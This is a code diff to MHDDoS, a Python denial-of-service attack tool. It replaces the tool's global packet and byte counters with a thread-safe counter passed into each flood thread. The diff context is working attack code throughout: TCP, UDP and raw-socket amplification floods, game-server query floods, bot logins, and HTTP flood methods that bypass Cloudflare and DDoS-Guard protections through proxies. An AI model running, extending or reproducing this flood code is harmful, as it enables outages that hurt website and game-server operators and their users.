@@ -4,7 +4,6 @@ import sys
 from contextlib import suppress
 from itertools import cycle
 from math import log2, trunc
-from multiprocessing import RawValue
 from os import urandom as randbytes
 from pathlib import Path
 from secrets import choice as randchoice
@@ -14,7 +13,7 @@ from ssl import CERT_NONE, SSLContext, create_default_context
 from struct import pack as data_pack
 from subprocess import run, PIPE
 from sys import exit as _exit
-from threading import Event, Thread
+from threading import Event, Thread, Lock
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
@@ -26,6 +25,7 @@ from cfscrape import create_scraper
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from requests import Response, Session, get, cookies
 from yarl import URL
+
 
 logging.basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s', datefmt="%H:%M:%S")
 logger = logging.getLogger("MHDDoS")
@@ -39,6 +39,24 @@ __dir__: Path = Path(__file__).parent
 __ip__: Any = None
 
 SOCK_TIMEOUT = 5
+
+
+class AtomicCounter:
+    def __init__(self, initial=0):
+        self.value = initial
+        self._lock = Lock()
+
+    def __iadd__(self, value):
+        self.increment(value)
+        return self
+
+    def __int__(self):
+        return self.value
+
+    def increment(self, num=1):
+        with self._lock:
+            self.value += num
+            return self.value
 
 
 def getMyIPAddress():
@@ -104,26 +122,6 @@ google_agents = [
 ]
 
 
-class Counter:
-    def __init__(self, value=0):
-        self._value = RawValue('i', value)
-
-    def __iadd__(self, value):
-        self._value.value += value
-        return self
-
-    def __int__(self):
-        return self._value.value
-
-    def set(self, value):
-        self._value.value = value
-        return self
-
-
-REQUESTS_SENT = Counter()
-BYTES_SEND = Counter()
-
-
 class Tools:
 
     @staticmethod
@@ -163,8 +161,7 @@ class Tools:
         return str(ProxyTools.Random.rand_str(lengh)).strip()
 
     @staticmethod
-    def send(sock: socket, packet: bytes):
-        global BYTES_SEND, REQUESTS_SENT
+    def send(sock: socket, packet: bytes, REQUESTS_SENT, BYTES_SEND):
         if not sock.send(packet):
             return False
         BYTES_SEND += len(packet)
@@ -172,8 +169,7 @@ class Tools:
         return True
 
     @staticmethod
-    def sendto(sock, packet, target):
-        global BYTES_SEND, REQUESTS_SENT
+    def sendto(sock, packet, target, REQUESTS_SENT, BYTES_SEND):
         if not sock.sendto(packet, target):
             return False
         BYTES_SEND += len(packet)
@@ -311,10 +307,13 @@ class Layer4(Thread):
 
     def __init__(self,
                  target: Tuple[str, int],
-                 ref: List[str] = None,
-                 method: str = "TCP",
-                 synevent: Event = None,
-                 proxies: Set[Proxy] = None):
+                 ref: List[str],
+                 method: str,
+                 synevent: Event,
+                 proxies: Set[Proxy],
+                 REQUESTS_SENT,
+                 BYTES_SEND,
+                 ):
         Thread.__init__(self, daemon=True)
         self._amp_payload = None
         self._amp_payloads = cycle([])
@@ -322,6 +321,8 @@ class Layer4(Thread):
         self._method = method
         self._target = target
         self._synevent = synevent
+        self.REQUESTS_SENT = REQUESTS_SENT
+        self.BYTES_SEND = BYTES_SEND
         if proxies:
             self._proxies = list(proxies)
 
@@ -397,7 +398,7 @@ class Layer4(Thread):
     def TCP(self) -> None:
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, randbytes(1024)):
+            while Tools.send(s, randbytes(1024), self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
@@ -407,15 +408,14 @@ class Layer4(Thread):
 
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            while Tools.send(s, handshake):
-                Tools.send(s, ping)
+            while Tools.send(s, handshake, self.REQUESTS_SENT, self.BYTES_SEND):
+                Tools.send(s, ping, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def CPS(self) -> None:
-        global REQUESTS_SENT
         s = None
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
-            REQUESTS_SENT += 1
+            self.REQUESTS_SENT += 1
         Tools.safe_close(s)
 
     def alive_connection(self) -> None:
@@ -426,15 +426,14 @@ class Layer4(Thread):
         Tools.safe_close(s)
 
     def CONNECTION(self) -> None:
-        global REQUESTS_SENT
         with suppress(Exception):
             Thread(target=self.alive_connection).start()
-            REQUESTS_SENT += 1
+            self.REQUESTS_SENT += 1
 
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1024), self._target):
+            while Tools.sendto(s, randbytes(1024), self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
@@ -443,7 +442,7 @@ class Layer4(Thread):
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
@@ -453,7 +452,7 @@ class Layer4(Thread):
         with suppress(Exception), socket(AF_INET, SOCK_RAW,
                                          IPPROTO_UDP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            while Tools.sendto(s, *payload):
+            while Tools.sendto(s, *payload, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
@@ -464,52 +463,48 @@ class Layer4(Thread):
                                                         47,
                                                         2,
                                                         ProxyTools.Random.rand_ipv4(),
-                                                        uuid4()))
-            Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"))
+                                                        uuid4()), self.REQUESTS_SENT, self.BYTES_SEND)
+            Tools.send(s, Minecraft.login(f"MHDDoS_{ProxyTools.Random.rand_str(5)}"), self.REQUESTS_SENT, self.BYTES_SEND)
             sleep(1.5)
 
             c = 360
-            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999))):
+            while Tools.send(s, Minecraft.keepalive(ProxyTools.Random.rand_int(1111111, 9999999)), self.REQUESTS_SENT, self.BYTES_SEND):
                 c -= 1
                 if c:
                     continue
                 c = 360
-                Tools.send(s, Minecraft.chat(Tools.randchr(100)))
+                Tools.send(s, Minecraft.chat(Tools.randchr(100)), self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def VSE(self) -> None:
-        global BYTES_SEND, REQUESTS_SENT
         payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                    b'\x20\x51\x75\x65\x72\x79\x00')
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
     def FIVEM(self) -> None:
-        global BYTES_SEND, REQUESTS_SENT
         payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
     def TS3(self) -> None:
-        global BYTES_SEND, REQUESTS_SENT
         payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
     def MCPE(self) -> None:
-        global BYTES_SEND, REQUESTS_SENT
         payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                    b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                    b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                    b'\x73')
         with socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, payload, self._target):
+            while Tools.sendto(s, payload, self._target, self.REQUESTS_SENT, self.BYTES_SEND):
                 continue
         Tools.safe_close(s)
 
@@ -560,12 +555,14 @@ class HttpFlood(Thread):
                  thread_id: int,
                  target: URL,
                  host: str,
-                 method: str = "GET",
-                 rpc: int = 1,
-                 synevent: Event = None,
-                 useragents: Set[str] = None,
-                 referers: Set[str] = None,
-                 proxies: Set[Proxy] = None) -> None:
+                 method: str,
+                 rpc: int,
+                 synevent: Event,
+                 useragents: Set[str],
+                 referers: Set[str],
+                 proxies: Set[Proxy],
+                 REQUESTS_SENT,
+                 BYTES_SEND) -> None:
         Thread.__init__(self, daemon=True)
         self.SENT_FLOOD = None
         self._thread_id = thread_id
@@ -575,6 +572,8 @@ class HttpFlood(Thread):
         self._target = target
         self._host = host
         self._raw_target = (self._host, (self._target.port or 80))
+        self.REQUESTS_SENT = REQUESTS_SENT
+        self.BYTES_SEND = BYTES_SEND
 
         if not self._target.host[len(self._target.host) - 1].isdigit():
             self._raw_target = (self._host, (self._target.port or 80))
@@ -683,7 +682,7 @@ class HttpFlood(Thread):
         s = None
         with  suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def STRESS(self) -> None:
@@ -695,7 +694,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def COOKIES(self) -> None:
@@ -709,7 +708,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def APACHE(self) -> None:
@@ -719,7 +718,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def XMLRPC(self) -> None:
@@ -737,14 +736,14 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def PPS(self) -> None:
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, self._defaultpayload)
+                Tools.send(s, self._defaultpayload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def KILLER(self) -> None:
@@ -756,7 +755,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def BOT(self) -> None:
@@ -780,17 +779,17 @@ class HttpFlood(Thread):
             "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n")
         s = None
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, p1)
-            Tools.send(s, p2)
+            Tools.send(s, p1, self.REQUESTS_SENT, self.BYTES_SEND)
+            Tools.send(s, p2, self.REQUESTS_SENT, self.BYTES_SEND)
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            while Tools.send(s, payload) and s.recv(1):
+            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
                 continue
         Tools.safe_close(s)
 
@@ -799,11 +798,10 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def CFB(self):
-        global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
@@ -813,24 +811,24 @@ class HttpFlood(Thread):
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        self.REQUESTS_SENT += 1
+                        self.BYTES_SEND += Tools.sizeOfRequest(res)
                         continue
 
                 with s.get(self._target.human_repr()) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
+                    self.REQUESTS_SENT += 1
+                    self.BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
     def CFBUAM(self):
         payload: bytes = self.generate_payload()
         s = None
         with suppress(Exception), self.open_connection() as s:
-            Tools.send(s, payload)
+            Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
             sleep(5.01)
             ts = time()
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                 if time() > ts + 120: break
         Tools.safe_close(s)
 
@@ -840,11 +838,10 @@ class HttpFlood(Thread):
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
                 sleep(max(self._rpc / 1000, 1))
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def DGB(self):
-        global REQUESTS_SENT, BYTES_SEND
         with suppress(Exception):
             proxies = None
             if self._proxies:
@@ -858,8 +855,8 @@ class HttpFlood(Thread):
                                 proxies=pro.asRequest()) as res:
                         if b'<title>DDOS-GUARD</title>' in res.content[:100]:
                             break
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        self.REQUESTS_SENT += 1
+                        self.BYTES_SEND += Tools.sizeOfRequest(res)
 
             Tools.safe_close(ss)
 
@@ -871,7 +868,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def DOWNLOADER(self):
@@ -880,17 +877,16 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
                 while 1:
                     sleep(.01)
                     data = s.recv(1)
                     if not data:
                         break
-            Tools.send(s, b'0')
+            Tools.send(s, b'0', self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def BYPASS(self):
-        global REQUESTS_SENT, BYTES_SEND
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
@@ -900,13 +896,13 @@ class HttpFlood(Thread):
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
-                        REQUESTS_SENT += 1
-                        BYTES_SEND += Tools.sizeOfRequest(res)
+                        self.REQUESTS_SENT += 1
+                        self.BYTES_SEND += Tools.sizeOfRequest(res)
                         continue
 
                 with s.get(self._target.human_repr()) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
+                    self.REQUESTS_SENT += 1
+                    self.BYTES_SEND += Tools.sizeOfRequest(res)
         Tools.safe_close(s)
 
     def GSB(self):
@@ -929,7 +925,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def NULL(self) -> None:
@@ -941,7 +937,7 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
         Tools.safe_close(s)
 
     def BOMB(self):
@@ -977,11 +973,11 @@ class HttpFlood(Thread):
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                Tools.send(s, payload)
-            while Tools.send(s, payload) and s.recv(1):
+                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
                 for i in range(self._rpc):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                    Tools.send(s, keep)
+                    Tools.send(s, keep, self.REQUESTS_SENT, self.BYTES_SEND)
                     sleep(self._rpc / 15)
                     break
         Tools.safe_close(s)
@@ -1031,12 +1027,13 @@ class HttpFlood(Thread):
         if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=None, stats_output=[]):
-    port = None
-    url = None
+def main(url, ip, method, threads, timer, proxy_fn=None, rpc=None, refl_li_fn=None, statistics=None, sock_timeout=5):
     event = Event()
     event.clear()
-    target = None
+    REQUESTS_SENT = statistics['requests']
+    BYTES_SEND = statistics['bytes']
+    global SOCK_TIMEOUT
+    SOCK_TIMEOUT = sock_timeout
 
     if method not in Methods.ALL_METHODS:
         exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
@@ -1047,7 +1044,6 @@ def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, refl_li_fn
         proxies = ProxyUtiles.readFromFile(proxy_li)
 
     if method in Methods.LAYER7_METHODS:
-        url = URL(urlraw)
         useragent_li = Path(__dir__ / "files/useragent.txt")
         referers_li = Path(__dir__ / "files/referers.txt")
         bombardier_path = Path.home() / "go/bin/bombardier"
@@ -1076,13 +1072,10 @@ def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, refl_li_fn
 
         for thread_id in range(threads):
             HttpFlood(thread_id, url, ip, method, rpc, event,
-                      uagents, referers, proxies).start()
+                      uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).start()
 
     if method in Methods.LAYER4_METHODS:
-        target = URL(urlraw)
-
-        port = target.port
-        target = target.host
+        port = url.port
 
         if port > 65535 or port < 1:
             exit("Invalid Port [Min: 1 / Max: 65535] ")
@@ -1103,26 +1096,10 @@ def main(method, urlraw, ip, threads, timer, proxy_fn=None, rpc=None, refl_li_fn
 
         for _ in range(threads):
             Layer4((ip, port), ref, method, event,
-                   proxies).start()
+                   proxies, REQUESTS_SENT, BYTES_SEND).start()
 
     event.set()
-    ts = time()
-
-    while time() < ts + timer:
-        stats_output.append((
-            target or url.host,
-            port or (url.port or 80),
-            method,
-            threads,
-            Tools.humanformat(int(REQUESTS_SENT)),
-            Tools.humanbytes(int(BYTES_SEND)),
-            round((time() - ts) / timer * 100, 2),
-        ))
-        REQUESTS_SENT.set(0)
-        BYTES_SEND.set(0)
-
-        sleep(2)
-
+    sleep(timer)
     event.clear()
     exit()
 
